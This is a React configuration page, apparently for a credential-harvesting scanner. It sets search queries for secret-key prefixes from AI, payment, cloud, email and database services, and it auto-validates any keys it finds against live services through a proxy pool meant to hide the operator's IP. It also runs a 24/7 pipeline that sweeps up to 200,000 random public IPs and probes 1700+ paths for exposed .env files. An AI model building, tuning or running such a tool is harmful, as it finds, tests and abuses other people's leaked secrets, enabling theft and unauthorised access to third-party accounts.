import React, { useEffect, useState } from "react";

const QUERY_PRESETS = [
  {
    category: "AI",
    color: "#a78bfa",
    queries: ["sk-proj-", "sk-ant-api03-", "sk-or-v1-", "AIzaSy", "hf_", "gsk_", "pplx-", "r8_", "msk-", "xai-", "OPENAI_API_KEY", "ANTHROPIC_API_KEY"],
  },
  {
    category: "Payments",
    color: "#34d399",
    queries: ["sk_live_", "sk_test_", "rk_live_", "STRIPE_SECRET_KEY", "STRIPE_API_KEY"],
  },
  {
    category: "Email",
    color: "#38bdf8",
    queries: ["SG.", "re_", "SENDGRID_API_KEY", "MAILGUN_API_KEY", "RESEND_API_KEY", "POSTMARK_"],
  },
  {
    category: "Cloud",
    color: "#fb923c",
    queries: ["AKIA", "dop_v1_", "AWS_ACCESS_KEY_ID", "DIGITALOCEAN_TOKEN", "CLOUDFLARE_API_TOKEN"],
  },
  {
    category: "Auth / VCS",
    color: "#facc15",
    queries: ["ghp_", "gho_", "glpat-", "eyJhbGci", "GITHUB_TOKEN", "GITLAB_TOKEN"],
  },
  {
    category: "Messaging",
    color: "#f472b6",
    queries: ["TELEGRAM_BOT_TOKEN", "hooks.slack.com", "discord.com/api/webhooks"],
  },
  {
    category: "Database",
    color: "#f87171",
    queries: ["postgres://", "mongodb+srv://", "redis://", "DATABASE_URL", "MONGODB_URI", "REDIS_URL"],
  },
];
import {
  useGetMonitorConfig,
  useUpdateMonitorConfig,
  getGetMonitorConfigQueryKey,
  useGetAutoChainStatus,
  useTriggerAutoChain,
  getGetAutoChainStatusQueryKey,
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Switch } from "@/components/ui/switch";
import { Save, Settings2, ShieldCheck, Clock, Zap, ListChecks, RotateCcw, Workflow, Play, Gauge, Power, Globe, Server, Wifi, Plus, Trash2, TestTube2, CheckCircle2, XCircle, Eye, EyeOff } from "lucide-react";
import { toast } from "sonner";
import { MonitorConfig } from "@workspace/api-zod/src/generated/types";

interface PathsData {
  paths: string[];
  source: "base" | "custom";
  count: number;
}

interface TuningValues {
  host_concurrency_cap_deep: number;
  path_sem_cap: number;
  path_sem_per_host: number;
  tcp_precheck_max_ms: number;
  tcp_precheck_min_ms: number;
  host_overall_timeout_sec: number;
}
interface TuningData {
  tuning: TuningValues;
  defaults: TuningValues;
  source: "defaults" | "file" | "invalid";
}
const TUNING_FIELDS: Array<{
  key: keyof TuningValues;
  label: string;
  hint: string;
  min: number;
  max: number;
}> = [
  { key: "host_concurrency_cap_deep", label: "Host Concurrency Cap (deep)", hint: "Max concurrent hosts in deep mode. Higher = faster, but findings can drop on flaky targets. VPS with 1M FD limit: 600–2000 recommended.", min: 5, max: 4000 },
  { key: "path_sem_cap",              label: "Path Semaphore Cap",          hint: "Global ceiling on in-flight HTTP requests. Sized for your CPU/FD limit. VPS: 20000–30000 safe with 1M FD limit.",                                  min: 100, max: 50000 },
  { key: "path_sem_per_host",         label: "Path Semaphore Per Host",     hint: "Max parallel path probes for a single host. Avoid being seen as a DoS. VPS: 100–200 recommended.",                                                  min: 5, max: 500 },
  { key: "tcp_precheck_max_ms",       label: "TCP Precheck Max (ms)",       hint: "Upper bound for the dead-host TCP probe. Lower = faster sweep, more false-negatives on slow live hosts. VPS/datacenter: 100ms works well.",         min: 40, max: 10000 },
  { key: "tcp_precheck_min_ms",       label: "TCP Precheck Min (ms)",       hint: "Lower bound for the TCP probe (must be < max). VPS: 40–50ms.",                                                                                       min: 10, max: 5000 },
  { key: "host_overall_timeout_sec",  label: "Host Overall Timeout (s)",    hint: "Hard ceiling for total time per host. Lower = faster sweep, skips slow hosts. VPS with fast network: 8–15s. Default 120s is for slow connections.", min: 5,  max: 1800 },
];

export default function Config() {
  const queryClient = useQueryClient();
  const { data: config, isLoading } = useGetMonitorConfig();
  const updateConfig = useUpdateMonitorConfig();

  const [localConfig, setLocalConfig] = useState<MonitorConfig | null>(null);
  const [queriesText, setQueriesText] = useState("");
  const [pathsData, setPathsData] = useState<PathsData | null>(null);
  const [pathsText, setPathsText] = useState("");
  const [pathsLoading, setPathsLoading] = useState(false);
  const [pathsSaving, setPathsSaving] = useState(false);

  const [tuningData, setTuningData] = useState<TuningData | null>(null);
  const [tuningDraft, setTuningDraft] = useState<Record<keyof TuningValues, string>>({
    host_concurrency_cap_deep: "",
    path_sem_cap: "",
    path_sem_per_host: "",
    tcp_precheck_max_ms: "",
    tcp_precheck_min_ms: "",
    host_overall_timeout_sec: "",
  });
  const [tuningSaving, setTuningSaving] = useState(false);

  const [proxyRaw, setProxyRaw]       = useState("");
  const [proxyEnabled, setProxyEnabled] = useState(false);
  const [proxyCount, setProxyCount]   = useState(0);
  const [proxySaving, setProxySaving] = useState(false);

  const { data: chainStatus } = useGetAutoChainStatus({
    query: { refetchInterval: 5_000 },
  });
  const triggerChain = useTriggerAutoChain();

  useEffect(() => {
    if (config) {
      setLocalConfig(config);
      setQueriesText(config.queries.join("\n"));
    }
  }, [config]);

  useEffect(() => {
    setPathsLoading(true);
    fetch("/api/env-scan/paths")
      .then(r => r.json())
      .then((d: PathsData) => {
        setPathsData(d);
        setPathsText(d.paths.join("\n"));
      })
      .catch(() => {})
      .finally(() => setPathsLoading(false));
  }, []);

  const loadTuning = async () => {
    try {
      const r = await fetch("/api/env-scan/tuning");
      const d: TuningData = await r.json();
      setTuningData(d);
      setTuningDraft({
        host_concurrency_cap_deep: String(d.tuning.host_concurrency_cap_deep),
        path_sem_cap:              String(d.tuning.path_sem_cap),
        path_sem_per_host:         String(d.tuning.path_sem_per_host),
        tcp_precheck_max_ms:       String(d.tuning.tcp_precheck_max_ms),
        tcp_precheck_min_ms:       String(d.tuning.tcp_precheck_min_ms),
        host_overall_timeout_sec:  String(d.tuning.host_overall_timeout_sec),
      });
    } catch {}
  };

  useEffect(() => { void loadTuning(); }, []);

  useEffect(() => {
    fetch("/api/monitor/user-proxies")
      .then(r => r.json())
      .then((d: { enabled: boolean; count: number; raw: string }) => {
        setProxyEnabled(d.enabled);
        setProxyCount(d.count);
        setProxyRaw(d.raw);
      })
      .catch(() => {});
  }, []);

  const handleSaveTuning = async () => {
    setTuningSaving(true);
    try {
      const body: Record<string, number> = {};
      for (const f of TUNING_FIELDS) {
        const n = Number(tuningDraft[f.key]);
        if (!Number.isFinite(n) || n <= 0) {
          toast.error(`${f.label}: must be a positive number`);
          setTuningSaving(false);
          return;
        }
        if (n < f.min || n > f.max) {
          toast.error(`${f.label}: out of range (${f.min}–${f.max})`);
          setTuningSaving(false);
          return;
        }
        body[f.key] = Math.floor(n);
      }
      const r = await fetch("/api/env-scan/tuning", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const d = await r.json();
      if (d.success) {
        toast.success("Scanner tuning saved · applies to next scan");
        await loadTuning();
      } else {
        toast.error((d.errors as string[] | undefined)?.join("; ") ?? "Save failed");
      }
    } catch {
      toast.error("Connection error");
    } finally {
      setTuningSaving(false);
    }
  };

  const handleResetTuning = async () => {
    setTuningSaving(true);
    try {
      await fetch("/api/env-scan/tuning", { method: "DELETE" });
      await loadTuning();
      toast.success("Reset to safe defaults");
    } catch {
      toast.error("Connection error");
    } finally {
      setTuningSaving(false);
    }
  };

  const handleSavePaths = async () => {
    setPathsSaving(true);
    try {
      const paths = pathsText.split("\n").map(p => p.trim()).filter(Boolean);
      const r = await fetch("/api/env-scan/paths", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ paths }),
      });
      const d = await r.json();
      if (d.success) {
        setPathsData(prev => prev ? { ...prev, source: "custom", count: paths.length } : null);
        toast.success(`Saved ${d.count} paths (custom override active)`);
      } else {
        toast.error("Failed to save paths");
      }
    } catch {
      toast.error("Connection error");
    } finally {
      setPathsSaving(false);
    }
  };

  const handleResetPaths = async () => {
    setPathsSaving(true);
    try {
      await fetch("/api/env-scan/paths", { method: "DELETE" });
      const r = await fetch("/api/env-scan/paths");
      const d: PathsData = await r.json();
      setPathsData(d);
      setPathsText(d.paths.join("\n"));
      toast.success(`Reset to ${d.count} base paths`);
    } catch {
      toast.error("Connection error");
    } finally {
      setPathsSaving(false);
    }
  };

  const handleSaveProxies = async () => {
    setProxySaving(true);
    try {
      const r = await fetch("/api/monitor/user-proxies", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ enabled: proxyEnabled, raw: proxyRaw }),
      });
      const d: { enabled: boolean; count: number } = await r.json();
      setProxyCount(d.count);
      setProxyEnabled(d.enabled);
      toast.success(`Proxy list saved · ${d.count} proxies loaded`);
    } catch {
      toast.error("Failed to save proxies");
    } finally {
      setProxySaving(false);
    }
  };

  const [restarting, setRestarting] = useState(false);
  const handleRestartServer = async () => {
    if (!window.confirm("Перезапустить API-сервер? Все активные запросы прервутся, но сканеры (Python/Go) продолжат работу — они отдельные процессы.")) return;
    setRestarting(true);
    try {
      await fetch("/api/monitor/restart", { method: "POST" });
      toast.info("Сервер перезапускается… подожди 3-5 секунд");
    } catch {
      // Network error is expected — server is shutting down
      toast.info("Сервер перезапускается… подожди 3-5 секунд");
    }
    // Auto-recover UI: poll until server is back, then reload
    const start = Date.now();
    const poll = async () => {
      try {
        const r = await fetch("/api/monitor/status", { cache: "no-store" });
        if (r.ok) {
          toast.success("Сервер снова онлайн");
          setRestarting(false);
          window.location.reload();
          return;
        }
      } catch {}
      if (Date.now() - start < 30000) {
        setTimeout(poll, 1000);
      } else {
        toast.error("Сервер не ответил за 30s — проверь воркфлоу");
        setRestarting(false);
      }
    };
    setTimeout(poll, 2000);
  };

  const handleSave = () => {
    if (!localConfig) return;

    const queries = queriesText.split("\n").map(q => q.trim()).filter(Boolean);
    const newConfig = { ...localConfig, queries };

    updateConfig.mutate({ data: newConfig }, {
      onSuccess: () => {
        toast.success("Configuration updated successfully");
        queryClient.invalidateQueries({ queryKey: getGetMonitorConfigQueryKey() });
      },
      onError: () => {
        toast.error("Failed to update configuration");
      }
    });
  };

  if (isLoading || !localConfig) {
    return <div className="p-8 text-center text-muted-foreground font-mono">LOADING CONFIGURATION...</div>;
  }

  return (
    <div className="max-w-4xl space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-bold tracking-wider uppercase text-primary terminal-glow flex items-center">
            <Settings2 className="w-5 h-5 mr-2" /> System Configuration
          </h2>
          <p className="text-sm text-muted-foreground font-mono mt-1">Core monitor engine parameters</p>
        </div>
        <div className="flex items-center gap-2">
          <Button
            onClick={handleRestartServer}
            disabled={restarting}
            variant="outline"
            className="font-mono font-bold border-destructive/50 text-destructive hover:bg-destructive/10"
            title="Gracefully restart the API server (workflow auto-recovers)"
          >
            <Power className="w-4 h-4 mr-2" /> {restarting ? 'RESTARTING…' : 'RESTART SERVER'}
          </Button>
          <Button onClick={handleSave} disabled={updateConfig.isPending} className="font-mono font-bold">
            <Save className="w-4 h-4 mr-2" /> {updateConfig.isPending ? 'SAVING...' : 'APPLY CONFIG'}
          </Button>
        </div>
      </div>

      <div className="grid gap-6 md:grid-cols-2">
        <Card className="bg-card border-border col-span-2 md:col-span-1">
          <CardHeader>
            <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
              <Clock className="w-4 h-4 mr-2 text-secondary" /> Timing & Load
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label className="text-xs font-mono uppercase text-muted-foreground">Scan Interval (Seconds)</Label>
              <Input 
                type="number" 
                value={localConfig.intervalSeconds} 
                onChange={e => setLocalConfig({...localConfig, intervalSeconds: Number(e.target.value)})}
                className="bg-background border-border font-mono text-sm"
              />
            </div>
            
            <div className="space-y-2">
              <Label className="text-xs font-mono uppercase text-muted-foreground">Concurrency Factor</Label>
              <Input
                type="number"
                value={localConfig.concurrency}
                onChange={e => setLocalConfig({...localConfig, concurrency: Number(e.target.value)})}
                className="bg-background border-border font-mono text-sm"
              />
              <div className="text-[10px] font-mono text-muted-foreground leading-relaxed">
                Global cap on parallel search requests. Per-source limits in
                sources.json (max_parallel) prevent any single engine from
                being hammered, so 25 is safe. Higher = faster cycle, more FDs.
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-mono uppercase text-muted-foreground flex items-center gap-2">
                GitHub Token <span className="text-[10px] normal-case text-muted-foreground/70">(optional)</span>
              </Label>
              <Input
                type="password"
                autoComplete="off"
                placeholder="ghp_… or github_pat_…"
                value={localConfig.githubToken ?? ""}
                onChange={e => setLocalConfig({...localConfig, githubToken: e.target.value})}
                className="bg-background border-border font-mono text-sm"
              />
              <div className="text-[10px] font-mono text-muted-foreground leading-relaxed">
                Personal access token for GitHub Code / Repos / Gists API.
                Anonymous = 60 req/h (gets rate-limited fast). With token =
                5000 req/h + cleaner JSON results. Stored in settings.json.
              </div>
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <Label className="text-xs font-mono uppercase text-muted-foreground">
                  Category Rotation
                </Label>
                <button
                  type="button"
                  role="switch"
                  aria-checked={localConfig.categoryRotation !== false}
                  onClick={() => setLocalConfig({
                    ...localConfig,
                    categoryRotation: !(localConfig.categoryRotation !== false),
                  })}
                  className={`relative inline-flex h-5 w-10 items-center rounded-full border transition-colors ${
                    localConfig.categoryRotation !== false
                      ? "bg-primary/30 border-primary"
                      : "bg-muted border-border"
                  }`}
                >
                  <span
                    className={`inline-block h-3 w-3 rounded-full bg-primary transition-transform ${
                      localConfig.categoryRotation !== false ? "translate-x-6" : "translate-x-1"
                    }`}
                  />
                </button>
              </div>
              <div className="text-[10px] font-mono text-muted-foreground leading-relaxed">
                ON (recommended): each cycle scans only ONE service category
                (ai → payments → cloud → auth → …) instead of all 100+ key
                prefixes. Cuts cycle time ~10×, full sweep across all
                categories completes in ~10-15 cycles. OFF: every cycle
                scans the full query list (slow, ~8 min/cycle).
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-mono uppercase text-muted-foreground">Max Results Per Source</Label>
              <Input 
                type="number" 
                value={localConfig.maxResultsPerSource} 
                onChange={e => setLocalConfig({...localConfig, maxResultsPerSource: Number(e.target.value)})}
                className="bg-background border-border font-mono text-sm"
              />
            </div>
            
            <div className="space-y-2">
              <Label className="text-xs font-mono uppercase text-muted-foreground">HTTP Timeout (Seconds)</Label>
              <Input 
                type="number" 
                value={localConfig.httpTimeoutSeconds} 
                onChange={e => setLocalConfig({...localConfig, httpTimeoutSeconds: Number(e.target.value)})}
                className="bg-background border-border font-mono text-sm"
              />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2 md:col-span-1">
          <CardHeader>
            <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
              <ShieldCheck className="w-4 h-4 mr-2 text-emerald-500" /> Validation Engine
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="flex items-center justify-between p-4 border border-border rounded-lg bg-muted/10">
              <div className="space-y-0.5">
                <Label className="text-sm font-bold font-mono">Auto-Validate Keys</Label>
                <div className="text-xs text-muted-foreground font-mono">
                  Automatically test discovered keys against service APIs
                </div>
              </div>
              <Switch 
                checked={localConfig.autoValidate} 
                onCheckedChange={checked => setLocalConfig({...localConfig, autoValidate: checked})}
              />
            </div>
            
            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
              <div className="flex items-start">
                <ShieldCheck className="w-5 h-5 text-destructive mt-0.5 mr-2" />
                <div>
                  <h4 className="text-sm font-bold text-destructive font-mono uppercase">Warning</h4>
                  <p className="text-xs text-muted-foreground mt-1">
                    Enabling auto-validation will make API requests to external services using the discovered credentials. This may expose your monitoring infrastructure IP.
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2">
          <CardHeader>
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
                  <Globe className="w-4 h-4 mr-2 text-cyan-400" /> Validation Proxies
                </CardTitle>
                <CardDescription className="font-mono text-xs mt-1">
                  Route key validation requests through your own proxy pool to avoid exposing this server's IP.
                  Format: <code className="bg-muted px-1 rounded">user:pass@host:port</code> — one per line.
                  {proxyCount > 0 && (
                    <span className="ml-2 text-cyan-400 font-semibold">{proxyCount} proxies loaded</span>
                  )}
                </CardDescription>
              </div>
              <div className="flex items-center gap-3 flex-shrink-0">
                <div className="flex items-center gap-2">
                  <Label className="text-xs font-mono uppercase text-muted-foreground">Use proxies</Label>
                  <Switch
                    checked={proxyEnabled}
                    onCheckedChange={async (v) => {
                      setProxyEnabled(v);
                      try {
                        await fetch("/api/monitor/user-proxies", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ enabled: v, raw: proxyRaw }),
                        });
                        toast.success(v ? "Proxies enabled — validations now routed through proxy pool" : "Proxies disabled — using direct connection");
                      } catch {
                        toast.error("Failed to save proxy state");
                      }
                    }}
                  />
                </div>
                <Button
                  size="sm"
                  onClick={handleSaveProxies}
                  disabled={proxySaving}
                  className="text-xs font-mono"
                >
                  <Save className="w-3.5 h-3.5 mr-1.5" />
                  {proxySaving ? "Saving…" : "Save proxies"}
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <Textarea
              value={proxyRaw}
              onChange={e => setProxyRaw(e.target.value)}
              className="min-h-[180px] font-mono text-xs bg-background border-border resize-y"
              placeholder={"user:pass@proxy1.example.com:10001\nuser:pass@proxy2.example.com:10002\n..."}
              spellCheck={false}
            />
            <div className="text-xs text-muted-foreground font-mono mt-2">
              Current: {proxyRaw.split("\n").filter(l => l.trim() && l.includes("@")).length} lines ·
              When enabled, each validation request picks a random proxy from the list ·
              Changes take effect immediately after saving (no server restart needed)
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2">
          <CardHeader>
            <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
              <Workflow className="w-4 h-4 mr-2 text-cyan-400" /> Auto-Chain Pipeline (Discovery → ENV)
            </CardTitle>
            <CardDescription className="font-mono text-xs">
              Periodically run a fresh Host Discovery sweep, then automatically feed the results into the ENV Scanner. Independent from the public scanner.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex items-center justify-between p-4 border border-border rounded-lg bg-muted/10">
              <div className="space-y-0.5">
                <Label className="text-sm font-bold font-mono">Enable Auto-Chain</Label>
                <div className="text-xs text-muted-foreground font-mono">
                  Repeat <span className="text-cyan-400">Discovery → ENV Scan</span> on a timer
                </div>
              </div>
              <Switch
                checked={localConfig.autoChainEnabled ?? false}
                onCheckedChange={checked => setLocalConfig({...localConfig, autoChainEnabled: checked})}
              />
            </div>

            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase text-muted-foreground">Cycle Interval (seconds)</Label>
                <Input
                  type="number"
                  min={300}
                  value={localConfig.autoChainIntervalSeconds ?? 1800}
                  onChange={e => setLocalConfig({...localConfig, autoChainIntervalSeconds: Number(e.target.value)})}
                  className="bg-background border-border font-mono text-sm"
                />
                <div className="text-[10px] text-muted-foreground font-mono">Time between full Discovery → ENV cycles</div>
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase text-muted-foreground">Max Hosts per Sweep</Label>
                <Input
                  type="number"
                  min={1000}
                  max={500000}
                  value={localConfig.autoChainMaxHosts ?? 200000}
                  onChange={e => setLocalConfig({...localConfig, autoChainMaxHosts: Number(e.target.value)})}
                  className="bg-background border-border font-mono text-sm"
                />
                <div className="text-[10px] text-muted-foreground font-mono">Random public IPs per discovery (200k recommended)</div>
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase text-muted-foreground">Discoveries per Public Cycle</Label>
                <Input
                  type="number"
                  min={1}
                  max={20}
                  value={localConfig.autoChainDiscoveriesPerPublic ?? 3}
                  onChange={e => setLocalConfig({...localConfig, autoChainDiscoveriesPerPublic: Number(e.target.value)})}
                  className="bg-background border-border font-mono text-sm"
                />
                <div className="text-[10px] text-muted-foreground font-mono">Loop discovery→ENV N times before waiting for next public cycle (24/7 mode)</div>
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase text-muted-foreground">Discovery Ports</Label>
                <Input
                  value={localConfig.autoChainPorts ?? "80,443,8080,8443"}
                  onChange={e => setLocalConfig({...localConfig, autoChainPorts: e.target.value})}
                  className="bg-background border-border font-mono text-sm"
                  placeholder="80,443,8080,8443"
                />
              </div>
              <div className="flex items-center justify-between p-3 border border-border rounded-lg bg-muted/10">
                <div className="space-y-0.5">
                  <Label className="text-sm font-bold font-mono">Deep ENV Scan</Label>
                  <div className="text-[10px] text-muted-foreground font-mono">
                    Scan all 1700+ paths (slower)
                  </div>
                </div>
                <Switch
                  checked={localConfig.autoChainDeepScan ?? false}
                  onCheckedChange={checked => setLocalConfig({...localConfig, autoChainDeepScan: checked})}
                />
              </div>
              <div className="flex items-center justify-between p-3 border border-border rounded-lg bg-muted/10 col-span-2">
                <div className="space-y-0.5">
                  <Label className="text-sm font-bold font-mono">Self-trigger Public Scanner</Label>
                  <div className="text-[10px] text-muted-foreground font-mono">
                    After each round, trigger the public scanner instead of waiting for its scheduled cycle (true 24/7 mode). When OFF — original behavior: chain waits for the public scanner's own interval.
                  </div>
                </div>
                <Switch
                  checked={localConfig.autoChainSelfTriggerPublic ?? false}
                  onCheckedChange={checked => setLocalConfig({...localConfig, autoChainSelfTriggerPublic: checked})}
                />
              </div>
            </div>

            <div className="bg-cyan-500/10 border border-cyan-500/20 rounded-lg p-3 space-y-2">
              <p className="text-[11px] text-muted-foreground font-mono leading-relaxed">
                Triggers automatically when the public scanner finishes a cycle (and after each <span className="text-cyan-400">Cycle Interval</span>). Skipped while a manual Discovery or ENV Scan is running.
              </p>
              {chainStatus && (
                <div className="grid grid-cols-2 gap-x-4 gap-y-1 pt-2 border-t border-cyan-500/20 text-[11px] font-mono">
                  <div className="text-muted-foreground">Phase:</div>
                  <div className={
                    chainStatus.phase === "discovery" ? "text-cyan-300" :
                    chainStatus.phase === "envscan"   ? "text-amber-300" :
                    chainStatus.phase === "cooldown"  ? "text-slate-400" :
                    "text-emerald-300"
                  }>
                    {chainStatus.phase.toUpperCase()}
                    {chainStatus.manualTriggerPending && <span className="ml-2 text-yellow-300">[QUEUED]</span>}
                  </div>
                  <div className="text-muted-foreground">Status:</div>
                  <div className="text-foreground/80 truncate">{chainStatus.message}</div>
                  <div className="text-muted-foreground">Public scanner:</div>
                  <div className={chainStatus.publicCycleInProgress ? "text-cyan-300" : "text-slate-400"}>
                    {chainStatus.publicCycleInProgress ? "cycling…" : "idle"}
                    {chainStatus.publicLastCycleAt && (
                      <span className="text-muted-foreground ml-2">
                        last: {new Date(chainStatus.publicLastCycleAt).toLocaleTimeString()}
                      </span>
                    )}
                  </div>
                  <div className="text-muted-foreground">Discovery / ENV pid:</div>
                  <div className="text-foreground/80">
                    {chainStatus.discoveryRunning ? "DISC running" : "—"} /{" "}
                    {chainStatus.envScanRunning ? "ENV running" : "—"}
                  </div>
                  <div className="text-muted-foreground">Round progress:</div>
                  <div className="text-foreground/80">
                    <span className="text-cyan-300">{chainStatus.discoveryCountThisRound ?? 0}</span>
                    {" / "}
                    <span className="text-foreground">{chainStatus.discoveriesPerRound ?? 3}</span>
                    {" iterations"}
                  </div>
                </div>
              )}
            </div>

            <div className="flex items-center justify-end">
              <Button
                type="button"
                variant="outline"
                size="sm"
                disabled={
                  triggerChain.isPending ||
                  (chainStatus?.phase === "discovery" || chainStatus?.phase === "envscan") ||
                  chainStatus?.manualTriggerPending
                }
                onClick={() => {
                  triggerChain.mutate(undefined, {
                    onSuccess: (resp) => {
                      if (resp.queued) {
                        toast.success(resp.message ?? "Auto-chain queued");
                      } else {
                        toast.error(resp.message ?? "Could not queue");
                      }
                      queryClient.invalidateQueries({ queryKey: getGetAutoChainStatusQueryKey() });
                    },
                    onError: () => toast.error("Failed to trigger auto-chain"),
                  });
                }}
                className="font-mono text-xs"
              >
                <Play className="w-3 h-3 mr-2" />
                Run Discovery → ENV Now
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2">
          <CardHeader>
            <div className="flex items-start justify-between gap-4">
              <div>
                <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
                  <Gauge className="w-4 h-4 mr-2 text-fuchsia-400" /> Go Scanner Tuning
                </CardTitle>
                <CardDescription className="font-mono text-xs mt-1">
                  Per-machine performance knobs for the Go env scanner. Applies on the next scan start. Source:{" "}
                  {tuningData?.source === "file"     && <span className="text-fuchsia-400">scanner_tuning.json</span>}
                  {tuningData?.source === "defaults" && <span className="text-muted-foreground">hardcoded defaults (no file)</span>}
                  {tuningData?.source === "invalid"  && <span className="text-yellow-400">file invalid → using defaults</span>}
                  {!tuningData                       && <span className="text-muted-foreground">loading…</span>}
                </CardDescription>
              </div>
              <div className="flex gap-2 flex-shrink-0">
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleResetTuning}
                  disabled={tuningSaving || !tuningData}
                  className="text-xs text-muted-foreground"
                  title="Delete scanner_tuning.json and revert to hardcoded defaults"
                >
                  <RotateCcw className="w-3.5 h-3.5 mr-1.5" /> Reset to defaults
                </Button>
                <Button
                  size="sm"
                  onClick={handleSaveTuning}
                  disabled={tuningSaving || !tuningData}
                  className="text-xs font-mono"
                >
                  <Save className="w-3.5 h-3.5 mr-1.5" />
                  {tuningSaving ? "Saving…" : "Save tuning"}
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <div className="grid gap-4 md:grid-cols-2">
              {TUNING_FIELDS.map(f => {
                const def = tuningData?.defaults?.[f.key];
                const cur = tuningData?.tuning?.[f.key];
                const draftN = Number(tuningDraft[f.key]);
                const isDirty = tuningData != null && Number.isFinite(draftN) && draftN !== cur;
                return (
                  <div key={f.key} className="space-y-2">
                    <div className="flex items-center justify-between">
                      <Label className="text-xs font-mono uppercase text-muted-foreground">{f.label}</Label>
                      {isDirty && (
                        <span className="text-[10px] font-mono text-amber-400 uppercase tracking-wider">unsaved</span>
                      )}
                    </div>
                    <Input
                      type="number"
                      min={f.min}
                      max={f.max}
                      value={tuningDraft[f.key]}
                      onChange={e => setTuningDraft(prev => ({ ...prev, [f.key]: e.target.value }))}
                      className="bg-background border-border font-mono text-sm"
                    />
                    <div className="text-[10px] text-muted-foreground font-mono leading-snug">
                      {f.hint}
                      {def !== undefined && (
                        <span className="ml-1 text-muted-foreground/70">
                          · default {def} · range {f.min}–{f.max}
                        </span>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
            <div className="bg-fuchsia-500/10 border border-fuchsia-500/20 rounded-lg p-3 mt-4 text-[11px] font-mono leading-relaxed text-muted-foreground">
              Resolution order: <span className="text-fuchsia-300">per-run env var</span> &gt;{" "}
              <span className="text-fuchsia-300">scanner_tuning.json</span> &gt;{" "}
              <span className="text-fuchsia-300">hardcoded defaults</span>. Findings parity verified at the defaults
              (host_concurrency_cap_deep=100 / path_sem_cap=4000). Pushing host_concurrency_cap_deep above ~120 measurably
              loses findings on flaky targets.
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2">
          <CardHeader>
            <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
              <Zap className="w-4 h-4 mr-2 text-primary" /> Search Queries
            </CardTitle>
            <CardDescription className="font-mono text-xs">One query per line. These are injected into search engine sources.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <Textarea 
              value={queriesText}
              onChange={e => setQueriesText(e.target.value)}
              className="min-h-[200px] font-mono text-sm bg-background border-border resize-y"
              placeholder="sk-ant-api03...&#10;sk-proj-..."
            />

            {/* Quick-add presets */}
            <div className="space-y-3">
              <div className="text-xs font-mono text-muted-foreground uppercase tracking-wider">Quick Add Presets</div>
              {QUERY_PRESETS.map(group => (
                <div key={group.category} className="space-y-1.5">
                  <div className="text-xs font-mono font-bold" style={{ color: group.color }}>{group.category}</div>
                  <div className="flex flex-wrap gap-1.5">
                    {group.queries.map(q => (
                      <button
                        key={q}
                        onClick={() => {
                          const lines = queriesText.split("\n").map(l => l.trim()).filter(Boolean);
                          if (!lines.includes(q)) {
                            setQueriesText(queriesText ? queriesText.trimEnd() + "\n" + q : q);
                          }
                        }}
                        className="px-2 py-0.5 rounded text-xs font-mono border transition-colors"
                        style={{ borderColor: group.color + "40", color: group.color, background: group.color + "18" }}
                        title={`Add "${q}"`}
                      >
                        {q}
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        <Card className="bg-card border-border col-span-2">
          <CardHeader>
            <div className="flex items-start justify-between">
              <div>
                <CardTitle className="text-sm uppercase text-muted-foreground tracking-wider flex items-center">
                  <ListChecks className="w-4 h-4 mr-2 text-blue-400" /> ENV Scan Paths
                </CardTitle>
                <CardDescription className="font-mono text-xs mt-1">
                  {pathsData
                    ? <>
                        {pathsData.count} paths loaded ·{" "}
                        {pathsData.source === "custom"
                          ? <span className="text-yellow-400">custom override active</span>
                          : <span className="text-muted-foreground">base list</span>}
                      </>
                    : "Loading…"}
                  {" · One path per line (e.g. <code>.env</code>, <code>config/.env</code>)"}
                </CardDescription>
              </div>
              <div className="flex gap-2 flex-shrink-0">
                {pathsData?.source === "custom" && (
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={handleResetPaths}
                    disabled={pathsSaving}
                    className="text-xs text-muted-foreground"
                  >
                    <RotateCcw className="w-3.5 h-3.5 mr-1.5" /> Reset to base
                  </Button>
